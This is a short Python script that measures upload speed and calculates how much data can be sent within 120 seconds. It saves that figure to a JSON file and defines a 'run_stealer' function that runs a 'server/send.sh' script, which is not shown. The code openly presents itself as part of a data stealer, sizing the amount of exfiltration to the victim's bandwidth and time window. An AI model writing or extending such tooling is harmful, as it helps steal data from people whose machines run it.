import subprocess
import speedtest
import json

MAX_SECONDS = 120
MIN_SPEED_MBIT = 5


def measure_upload_mbit() -> float:
    s = speedtest.Speedtest()
    s.get_best_server()
    upload_bps = s.upload()
    return upload_bps / 1_000_000  # bit/s -> Mbit/s


def get_transfer_amount(upload_speed_mbit: float) -> int:
    if upload_speed_mbit < MIN_SPEED_MBIT:
        return 100 * 1024 * 1024  # 100 MB fallback

    bytes_per_second = (upload_speed_mbit * 1_000_000) / 8
    return int(bytes_per_second * MAX_SECONDS)


if __name__ == "__main__":
    try:
        speed = measure_upload_mbit()
        print(f"Upload: {speed:.2f} Mbit/s")

        transfer_amount = get_transfer_amount(speed)

        with open("transfer_amount.json", "w") as f:
            json.dump({"transfer_bytes": transfer_amount}, f, indent=2)

    except Exception as e:
        print("Speedtest failed:", e)

def run_stealer():
    result = subprocess.run(
        ["bash", "server/send.sh"],
        check=True, 
    )